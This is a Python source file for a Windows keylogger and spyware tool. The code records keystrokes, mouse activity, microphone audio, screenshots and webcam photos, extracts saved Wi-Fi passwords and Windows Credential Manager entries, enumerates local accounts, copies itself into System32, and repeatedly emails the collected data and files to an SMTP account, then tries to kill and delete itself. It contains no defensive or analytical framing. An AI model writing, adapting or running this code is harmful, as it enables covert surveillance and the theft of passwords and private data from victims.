try:    
    import os
    import cv2
    import wmi
    import time
    import socket
    import shutil
    import signal
    import atexit
    import base64
    import getpass
    import smtplib
    import requests
    import platform
    import pythoncom
    import threading
    import win32cred
    import subprocess
    import pyscreenshot
    import soundfile as sf
    import sounddevice as sd
    from pynput import keyboard
    from pynput.mouse import Listener as MouseListener
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email.mime.text import MIMEText
    from email import encoders

except ModuleNotFoundError:
    modules = ["opencv-python", "wmi", "pywin32", "requests", "pyscreenshot", "sounddevice", "soundfile", "pynput"]
    for module in modules:
        subprocess.run(["pip", "install", module])

finally:
    temp_dir = "temp"
    os.makedirs(temp_dir, exist_ok = True)

    def cleanup_temp_dir():
        if os.path.exists(temp_dir) and os.path.isdir(temp_dir):
            shutil.rmtree(temp_dir)
        else:
            pass

    def handle_exit(signum, frame):
        cleanup_temp_dir()
        exit(0)

    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    atexit.register(cleanup_temp_dir)

    EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS"
    EMAIL_PASSWORD = "YOUR_PASSWORD"
    IP_INFO_TOKEN = "YOUR_IP_INFO_TOKEN"
    SEND_REPORT_EVERY = 10

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started...\n"
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            current_move = f"Mouse moved to {x} {y}\n"
            self.appendlog(current_move)

        def on_click(self, x, y, button, pressed):
            action = "Pressed" if pressed else "Released"
            button_name = str(button).split('.')[-1]
            current_click = f"Mouse {action} at {x} {y} ({button_name})\n"
            self.appendlog(current_click)

        def on_scroll(self, x, y, dx, dy):
            current_scroll = f"Mouse scrolled at {x} {y} ({dx}, {dy})\n"
            self.appendlog(current_scroll)


        def save_data(self, key):
            try:
                current_key = str(key.char)
                if current_key == ' ':
                    current_key = " "
            except AttributeError:
                if key == key.space:
                    current_key = " "
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "
            
            self.appendlog(current_key)

        def send_mail(self, message_subject, message_body, attachment_paths=None):
            sender = self.email
            receiver = self.email

            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = message_subject

            body = message_body
            msg.attach(MIMEText(body, 'plain'))

            if attachment_paths:
                for attachment_path in attachment_paths:
                    attachment = MIMEBase('application', 'octet-stream')
                    with open(attachment_path, 'rb') as attachment_file:
                        attachment.set_payload(attachment_file.read())
                    encoders.encode_base64(attachment)
                    attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
                    msg.attach(attachment)

            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(self.email, self.password)
                server.sendmail(sender, receiver, msg.as_string())

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY

            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()

            audio_path = os.path.join(temp_dir, "audio.wav")
            sf.write(audio_path, recording, fs)

        def screenshot(self):
            img = pyscreenshot.grab()

            img_path = os.path.join(temp_dir, "screenshot.png")
            img.save(img_path)


        def get_wifi_passwords(self):
            wifi_passwords = []

            try:
                profiles = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8", errors = "replace")
                profile_names = [line.split(":")[1].strip() for line in profiles.splitlines() if "All User Profile" in line]
                
                for name in profile_names:
                    try:
                        wifi_info = subprocess.check_output(["netsh", "wlan", "show", "profile", "name=" + name, "key=clear"]).decode("utf-8", errors = "replace")
                        password = [line.split(":")[1].strip() for line in wifi_info.splitlines() if "Key Content" in line][0]
                        wifi_passwords.append({"WiFi Name": name, "Password": password})
                    except subprocess.CalledProcessError:
                        continue

            except subprocess.CalledProcessError:
                wifi_passwords.append({"WiFi Name": "Error retrieving WiFi passwords.", "Password": ""})

            return wifi_passwords

        def get_ip_config(self):
            try:
                ip_config_output_bytes = subprocess.check_output(["ipconfig", "/all"])
                ip_config_output = ip_config_output_bytes.decode("utf-8", errors = "replace")
                return ip_config_output
            
            except subprocess.CalledProcessError:
                return "Error retrieving IP configuration."

        def take_photo(self):
            cap = cv2.VideoCapture(0)

            if not cap.isOpened():
                self.appendlog("Camera failed to open...\n\n")
                return

            ret, frame = cap.read()

            if not ret:
                self.appendlog("Frame could not be captured.\n\n")
                return

            if cap.isOpened():
                self.appendlog("Frame saved successfully.\n\n")

                frame_path = os.path.join(temp_dir, "captured_frame.jpg")
                cv2.imwrite(frame_path, frame)

                cv2.destroyAllWindows()
                cap.release()

        def get_systeminfo(self):
            systeminfo_output_bytes = subprocess.check_output(["systeminfo"])
            systeminfo_output = systeminfo_output_bytes.decode("utf-8", errors = "replace")
            self.appendlog(systeminfo_output)

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            user = getpass.getuser()

            ip_config = self.get_ip_config()
            
            system_info = f"Hostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\nUser: {user}\n"
            system_info += f"{ip_config}\n"
            
            self.appendlog(system_info)

        def formatted_data(self, data, indent = 0):
            formatted_output = ""
            for key, value in data.items():
                if isinstance(value, dict):
                    formatted_output += "   "
                    formatted_output += "\n\n" + "   " + "   " * indent + f"{key}:"
                    formatted_output += self.formatted_data(value, indent + 1)
                else:
                    formatted_output += "\n" + "   " + "   " * indent + f"{key}: {value}"
            return formatted_output

        def get_own_ip_info(self, token):
            url = "https://ipinfo.io/json"
            headers = {
                "Authorization": f"Bearer {token}"
            }
            response = requests.get(url, headers = headers)
            data = response.json()

            ordered_keys = [
                "ip", "hostname", "city", "region", "country", "loc",
                "postal", "timezone", "asn", "company", "privacy",
                "abuse", "domains"
            ]

            ordered_data = {key: data[key] for key in ordered_keys if key in data}
            
            formatted_info = self.formatted_data(ordered_data)
            self.appendlog("Internet Protocol Info:")
            self.appendlog(formatted_info)
            
        def get_credentials(self):
            credentials = []

            creds = win32cred.CredEnumerate(None, 0)

            if creds:
                for cred in creds:
                    username = cred['UserName']
                    target_name = cred['TargetName']
                    credential_blob = cred['CredentialBlob']
                    
                    if credential_blob:
                        password = self.get_password_from_blob(credential_blob)
                    else:
                        password = ""

                    credentials.append((username, target_name, password))

            return credentials

        def get_password_from_blob(self, credential_blob):
            try:
                base64.b64decode(credential_blob)
                password = credential_blob.decode('latin-1')
                return password
            except Exception:
                return "Error decoding password"        
            
        def get_and_send_credentials(self):
            try:
                credentials = self.get_credentials()

                if credentials:
                    self.appendlog('Credentials saved to txt file.\n\n')
                    credentials_text = ""
                    for idx, (username, target_name, password) in enumerate(credentials, start = 1):
                        credentials_text += f"Credentials {idx}:\n"
                        credentials_text += f"Username: {username}\n"
                        credentials_text += f"Target Name: {target_name}\n"
                        credentials_text += f"Password: {password}\n\n"

                    credentials_path = os.path.join(temp_dir, "credentials.txt")
                    with open(credentials_path, "w") as f:
                        f.write(credentials_text)

                else:
                    self.appendlog("No credentials found.\n\n")
            except Exception as e:
                self.appendlog("An error occurred while getting credentials: {}\n\n".format(e))
            
        def get_local_users_info(self):
            pythoncom.CoInitialize()
            c = wmi.WMI()
            users = c.Win32_UserAccount()

            user_info_list = []

            for user in users:
                user_info = {
                    "Username": user.Caption,
                    "Name": user.Name,
                    "FullName": user.FullName,
                    "Domain": user.Domain,
                    "Description": user.Description,
                    "SID": user.SID,
                    "Disabled": user.Disabled,
                    "AccountType": user.AccountType,
                    "Status": user.Status,
                    "LocalAccount": user.LocalAccount,
                    "Lockout": user.Lockout,
                    "PasswordChangeable": user.PasswordChangeable,
                    "PasswordExpires": user.PasswordExpires,
                    "PasswordRequired": user.PasswordRequired,
                }
                user_info_list.append(user_info)

            return user_info_list

        def print_user_info(self, user_info):
            user_info_str = f"Username: {user_info['Username']}\n" \
                            f"  Name: {user_info['Name']}\n" \
                            f"  FullName: {user_info['FullName']}\n" \
                            f"  Domain: {user_info['Domain']}\n" \
                            f"  Description: {user_info['Description']}\n" \
                            f"  SID: {user_info['SID']}\n" \
                            f"  Disabled: {user_info['Disabled']}\n" \
                            f"  Account Type: {user_info['AccountType']}\n" \
                            f"  Status: {user_info['Status']}\n" \
                            f"  Local Account: {user_info['LocalAccount']}\n" \
                            f"  Lockout: {user_info['Lockout']}\n" \
                            f"  Password Changeable: {user_info['PasswordChangeable']}\n" \
                            f"  Password Expires: {user_info['PasswordExpires']}\n" \
                            f"  Password Required: {user_info['PasswordRequired']}\n\n" \
                            f"{'-' * 40}"\
                            f"\n\n"
            self.appendlog(user_info_str)

        def get_and_send_local_users_info(self):
            
            local_users_info = self.get_local_users_info()

            c = wmi.WMI()
            users = c.Win32_UserAccount()

            if local_users_info:
                self.appendlog("Local User Accounts:\n")
                for username in users:
                    self.appendlog(f"-   {username.Name}\n")
                self.appendlog('\n')
                for user_info in local_users_info:
                    self.print_user_info(user_info)
            else:
                self.appendlog("No local user accounts found.\n")

        def copy_to_system32(self):
            try:
                source_path = os.path.abspath(__file__)
                destination_path = r"C:\Windows\System32"
                
                target_file_path = os.path.join(destination_path, os.path.basename(source_path))
                            
                if not os.path.exists(target_file_path):
                    shutil.copy(source_path, destination_path)
                    self.appendlog(f"File successfully copied to {destination_path} directory.\n\n")

                else:
                    self.appendlog(f"File already exists in {destination_path} directory.\n\n")
                            
            except PermissionError:
                self.appendlog(f"Access denied while copying file to {destination_path}.\n\n")

            except Exception as e:
                self.appendlog("An error occurred:", e)
                self.appendlog('\n\n')

        def clear_log(self):
            self.log = ""

        def run(self):
            microphone_thread = threading.Thread(target = self.microphone)
            screenshot_thread = threading.Thread(target = self.screenshot)

            credentials_thread = threading.Thread(target = self.get_and_send_credentials)

            local_users_thread = threading.Thread(target = self.get_and_send_local_users_info)
            local_users_thread.start()

            mouse_listener = MouseListener(on_move = self.on_move, on_click = self.on_click, on_scroll = self.on_scroll)
            keyboard_listener = keyboard.Listener(on_press = self.save_data)

            self.system_information()
            self.get_systeminfo()
            self.take_photo()
            credentials_thread.start()
            self.copy_to_system32()
            self.get_own_ip_info(IP_INFO_TOKEN)

            wifi_passwords = self.get_wifi_passwords()
            wifi_info_string = "\n".join([f"WiFi Name: {item['WiFi Name']}, Password: {item['Password']}" for item in wifi_passwords])

            self.appendlog("\n\nWiFi Information On The Target System:\n\n")
            self.appendlog(wifi_info_string)
            self.appendlog('\n\n')
            
            with keyboard_listener, mouse_listener:
                microphone_thread.start()
                screenshot_thread.start()

                microphone_thread.join()
                screenshot_thread.join()
                credentials_thread.join()
                local_users_thread.join()

                attachment_paths = [
                    os.path.join(temp_dir, "audio.wav"),
                    os.path.join(temp_dir, "screenshot.png"),
                    os.path.join(temp_dir, "captured_frame.jpg"),
                    os.path.join(temp_dir, "credentials.txt")
                ]
                self.send_mail("Keylogger Report", self.log, attachment_paths)

            self.clear_log()

            while True:
                microphone_thread = threading.Thread(target = self.microphone)
                screenshot_thread = threading.Thread(target = self.screenshot)
                
                mouse_listener = MouseListener(on_move = self.on_move, on_click = self.on_click, on_scroll = self.on_scroll)
                keyboard_listener = keyboard.Listener(on_press = self.save_data)

                self.take_photo()

                with keyboard_listener, mouse_listener:
                    microphone_thread.start()
                    screenshot_thread.start()

                    microphone_thread.join()
                    screenshot_thread.join()

                    attachment_paths = [
                        os.path.join(temp_dir, "audio.wav"),
                        os.path.join(temp_dir, "screenshot.png"),
                        os.path.join(temp_dir, "captured_frame.jpg"),
                    ]
                    self.send_mail("Keylogger Report", self.log, attachment_paths)
                    
                    time.sleep(SEND_REPORT_EVERY)

    if __name__ == "__main__":
        keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
        keylogger.run()
        try:
            pwd = os.path.abspath(os.getcwd())
            os.chdir(pwd)
            os.system("TASKKILL /F /IM " + os.path.basename(__file__))
            keylogger.appendlog('File was closed.')
            os.system("DEL " + os.path.basename(__file__))
        except OSError:
            keylogger.appendlog('File is close.')
